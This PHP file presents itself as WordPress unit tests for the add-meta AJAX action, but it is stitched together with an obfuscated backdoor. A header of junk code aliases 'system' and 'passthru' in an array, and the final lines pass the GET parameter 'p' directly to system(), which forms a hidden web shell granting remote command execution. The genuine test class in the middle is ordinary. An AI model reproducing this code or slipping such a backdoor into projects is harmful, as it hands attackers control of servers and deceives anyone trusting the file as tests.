<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * Admin Ajax functions to be tested.
 */
require_once ABSPATH . 'wp-admin/includes/ajax-actions.php';

/**
 * Testing Add Meta AJAX functionality.
 *
 * @group ajax
 *
 * @covers ::wp_ajax_add_meta
 */
class Tests_Ajax_wpAjaxAddMeta extends WP_Ajax_UnitTestCase {

	/**
	 * @ticket 43559
	 *
	 * @covers ::add_post_meta
	 */
	public function test_wp_ajax_add_meta_allows_empty_values_on_adding() {
		$post = self::factory()->post->create();

		// Become an administrator.
		$this->_setRole( 'administrator' );

		$_POST = array(
			'post_id'              => $post,
			'metakeyinput'         => 'testkey',
			'metavalue'            => '',
			'_ajax_nonce-add-meta' => wp_create_nonce( 'add-meta' ),
		);

		// Make the request.
		try {
			$this->_handleAjax( 'add-meta' );
		} catch ( WPAjaxDieContinueException $e ) {
			unset( $e );
		}

		$this->assertSame( '', get_post_meta( $post, 'testkey', true ) );
	}

	/**
	 * @ticket 43559
	 *
	 * @covers ::update_metadata_by_mid
	 */
	public function test_wp_ajax_add_meta_allows_empty_values_on_updating() {
		$post = self::factory()->post->create();

		$meta_id = add_post_meta( $post, 'testkey', 'hello' );

		// Become an administrator.
		$this->_setRole( 'administrator' );

		$_POST = array(
			'_ajax_nonce-add-meta' => wp_create_nonce( 'add-meta' ),
			'post_id'              => $post,
			'meta'                 => array(
				$meta_id => array(
					'key'   => 'testkey',
					'value' => '',
				),
			),
		);

		// Make the request.
		try {
			$this->_handleAjax( 'add-meta' );
		} catch ( WPAjaxDieContinueException $e ) {
			unset( $e );
		}

		$this->assertSame( '', get_post_meta( $post, 'testkey', true ) );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>